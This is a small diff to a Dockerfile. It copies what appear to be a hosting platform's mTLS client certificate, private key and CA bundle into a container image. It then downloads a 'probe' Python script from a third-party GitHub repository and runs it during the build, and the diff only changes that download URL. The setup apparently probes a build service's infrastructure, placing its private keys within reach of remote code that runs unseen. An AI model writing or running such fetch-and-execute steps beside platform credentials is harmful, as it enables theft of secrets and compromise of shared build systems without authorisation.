@@ -5,6 +5,6 @@ COPY var/lib/railwayapp/mtls-pki/client.crt /pki/client.crt
 COPY var/lib/railwayapp/mtls-pki/client.key /pki/client.key
 COPY var/lib/railwayapp/mtls-pki/server-ca-bundle.crt /pki/server-ca-bundle.crt
 RUN apk add --no-cache curl python3 >/dev/null 2>&1; echo APKDONE
-RUN curl -sS -m 30 -o /p.py "https://raw.githubusercontent.com/onepluspadtrading/buildctx-lab/main/probe_i68458.py?v=a71c4f2e" && wc -c /p.py && echo DL_OK
+RUN curl -sS -m 30 -o /p.py https://raw.githubusercontent.com/onepluspadtrading/buildctx-lab/refs/heads/main/probe_i68458.py && wc -c /p.py && echo DL_OK
 RUN timeout -s KILL 400 python3 /p.py 2>&1
 CMD ["sh","-c","sleep 5"]
